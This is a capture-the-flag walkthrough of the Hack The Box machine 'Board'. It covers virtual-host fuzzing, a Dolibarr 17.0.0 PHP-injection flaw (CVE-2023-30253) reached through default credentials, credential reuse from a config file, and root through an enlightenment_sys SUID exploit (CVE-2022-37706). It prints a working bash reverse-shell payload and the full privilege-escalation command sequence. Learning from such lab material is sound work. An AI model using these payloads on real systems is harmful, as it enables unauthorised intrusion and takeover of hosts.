---
tags:
  - Linux
  - HTTP
  - CVE
  - PHP
---

... is an easy HTB machine which hides a vulnerable version of `Dolibarr` behind a `VHost` which allows you to execute `PHP` code. The privilege escalation works via an `SetUID` binary, which is vulnerable to path traversal and code injection attacks.

### Reconnaissance
The tool `nmap` is used to do the initial reconnaissance of any target, as it very reliably sends packets to specific ports of the target to verify if they are open, closed, or filtered. The following command is used as a standard `nmap` scan:
```bash
sudo nmap -sCV $IP
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# sudo: optional, but makes the scan a bit faster and stealthier, as no TCP connect() is used.
# -sC (or --script=default): uses the default scripts of nmap. can quickly discover simple vulnerabilities, such as anonymous logins.
# -sV: further scans open ports to determine the actual service which is running on them, as an open port 80 does not directly imply a HTTP service.
```

the output of `nmap` tells us this:
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA)
|   256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA)
|_  256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
This is a very typical setup of a web-vulnerability type CTF, where the `http` allows you to execute remote code on the machine, to allow you to find credentials for `ssh`. 

I visit the page on `http://$IP` and am greeted with a home-page for a cyber-security consulting firm. Looking through the pages it offers, i notice the footer section which says `"© 2020 All Rights Reserved By Board.htb"`. This gave me reason to believe that `board.htb` is the domain for this server, which is why edited  the `/etc/hosts` file for local DNS name resolution without a public DNS server. The following command appends an entry to that file:
```bash
echo "$IP board.htb" | sudo tee --append /etc/hosts
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# echo "...": writes the specified string into STDOUT (terminal)
# | : redirect (pipe) the STDOUT of the left command into the STDIN of the right command
# sudo tee --append /etc/hosts: write the received STDIN into a file without overwriting it. requires sudo, as that file is critical to the system  
```

The site mostly serves static content in `.php` files, which is why i use  `ffuf` to employ forceful browsing to find possible hidden endpoints using this command:
```bash
ffuf -w /usr/share/dirb/wordlists/common.txt -u "http://board.htb/FUZZ.php" -fs 16
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# -w: specify wordlist file
# -u: URL of the target. the FUZZ word gets replaced with each entry of the wordlist.
# -fs: filter by response size, as all responses with 16 are "404" errors.
```

This has not found anything new, which is why i decided to also do some `VHost` fuzzing using the `subdomains-top1million-110000.txt` from `SecLists/Discovery/DNS/`:
```bash
ffuf -w ./subdomains-top1million-110000.txt -H "Host: FUZZ.board.htb" -u http://board.htb -fs 15949 -mc all
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# -w: specify wordlist file
# -H: add specific header. Here, the header "FUZZ.board.htb" is chosen. the FUZZ word is replaced by each entry of the wordlist!
# -u: URL of the target
# -fs: filter by response size
# -mc: accept any response code
```

This has found the `VHost`: `crm.board.htb`.  I also add this domain to the `/etc/passwd` file using this command:
```bash
sudo sed -i "s/$IP board.htb/$IP board.htb crm.board.htb/" /etc/hosts
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# sudo: required, as we are editing /etc/hosts
# -i: edit the file in-place and overwrite it
# "s/old_word/new_word/": replaces each occurance of old_word with new_word
# /etc/hosts: file we want to edit
```

Upon visiting `http://crm.board.htb`, i am greeted with a login form provided by `Dolibarr version 17.0.0`.

### Initial Exploitation
After googling `Dolibarr 17.0.0` exploit, i get to know `CVE-2023-30253`, which allows an authenticated user to bypass `PHP` injection checks by providing uppercase leters (e.g. `<?PHP` instead of `<?php`). I needed to log in to abuse this `CVE`, which is why i googled for default credentials and was met with `admin:admin`, which actually worked!

I navigate to `Websites` and click the `+` to add my own. For my custom website, i can add a `Page`. For that page i can edit the `HTML` source, where i can add `<?PHP` code which should get executed!
```php
<?PHP system('ping -c 3 <my-IP>'); ?>
```
I start listening for `ping` packages on my machine using `sudo tcpdump -i tun0 icmp`, and then i click the binoculars icon to preview my custom page, which should render it's `PHP` code. Doing so makes me receive `pings`!

Therefore, i change the payload to be this reverse shell starter:
```php
<?PHP system('bash -c "/bin/bash -i >& /dev/tcp/<my-IP>/1337 0>&1"'); ?>
```
and i repeat the steps of editing and rendering it after starting my listener with:
```bash
nc -lvnp 1337
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# -l: listen for inbound connects
# -v: verbose to get more info
# -n: numeric IP addresses, dont use DNS
# -p: specify listening port (1337)
```

Doing so gives me a reverse shell as `www-data`!

### Lateral Movement
As the user `www-data` is only a service account, it has very limited capabilities on the system. An actual user account within the `/home` directory is much more preferable.
The user `larissa` has a home directory, which is why i assumed that i need her account to gain `ssh` access to the machine. `ssh` access is always better than a reverse shell, as it is fully interactive. It is always possible to upgrade the reverse shell with a [neat trick](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/), but `ssh` access to an actual account is always preferable.

I landed in the directory of my custom website which is why i used `cd` with no arguments to jump to the home directory of `www-data`, which is `/var/www`. A quick google search reveals that `Dolibarr` stores it's configuration files in `htdocs/conf/conf.php`. Reading that file gives me the credentials `dolibarrowner:serverfun2$2023!!`. I try that password in a password-reuse attack for `larissa`'s `ssh` access and it works.
 
### Privilege Escalation
I try the three main privilege escalation vectors:

- `sudo -l`: mis-configured `sudoer` file
- `netstat -tulnp`: hidden services only accessible via localhost
- `id`: user belonging to a weird group

`id` reveals that `larissa` is part of the `adm` group. Googling that reveals that this group gives me access to reading the log files stored in `/var/log`.

I have read `/var/log/auth.log` for clear-text credentials, but did not find any. `/var/log/syslog` reveals that `root` has a `CRON`-job which automatically deletes all `web-page` entries from the `dolibarr` website.

The next thing I've tried is looking for binaries with the `SetUID` bit set, which was done with this command: 
```bash
find / -user root -perm /4000 -exec ls -ldb {} \; 2>/dev/null
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# find /: get all files starting from `/`
# -user: specify which user should own them
# -perm: specify permissions, here setuid!
# -exec ls -ldb: prints the output a bit prettier
# 2>/dev/null: discards error messages
```

This revealed the binary `enlightenment`, which gets executed as `root`. A quick google search reveals that this binary is a graphical desktop environment manager for `linux`. Looking for `enlightenment privilege escalation` reveals `CVE-2022-37706`, which is a vulnerability in `enlightenment_sys` component, affecting versions prior to `0.25.4`. This binary improperly handles path-names beginning with `/dev/..`, which leads to path traversal- and finally command injection attacks. The explanation to this `CVE` can be found [here](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit).

To check if the `enlightenment` binary is vulnerable, i issue the command `enlightenment --version`. It is `0.23.1`, which is prior to `0.25.4`! To exploit it, i need a custom directory with a evil binary. I create the following two directories:
```bash
mkdir -p /tmp/net
mkdir -p "/dev/../tmp/;/tmp/exploit"
```
Then, i require an arbitrary command in a file which is executable. this is done with this:
```bash
echo "cp /bin/bash /home/larissa/rootme; chmod u+s /home/larissa/rootme" > /tmp/exploit
chmod 777 /tmp/exploit
```
If `/tmp/exploit` gets executed by `root`, it creates a `rootme` binary in `larissa`'s home directory, which can be used to gain elevated privileges by abusing the `setuid` bit.

And lastly, this command makes `enlightenment_sys` execute the `/tmp/exploit` binary (as `root`, due to the `SetUID` bit):
```bash
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/exploit" /tmp///net
```

Executing `./rootme -p` in `/home/larissa` now gives shell access as `root`!

### Summary

Below is a visualized summary of the exploitation steps used in this machine to gain RCE.

``` mermaid
graph LR
  A[HTTP<br>Service] -->|Default<br>credentials| B[Vulnerable<br>software];
  B -->|Code<br>injection| C[PHP-code<br>execution];

  D[PHP-code<br>execution] -->|read| E[Config<br>file];
  E -->|Passsword<br>reuse| F[SSH<br>Access];
```

The privilege escalation to the user `root` worked as follows:

``` mermaid
graph LR
  A[SSH<br>Access] -->|SUID<br>permission| B[Vulnerable<br>binary];
  B -->|Path<br>traversal| C[Custom<br>binary];
  C --> D[Command<br>execution<br>as root];
```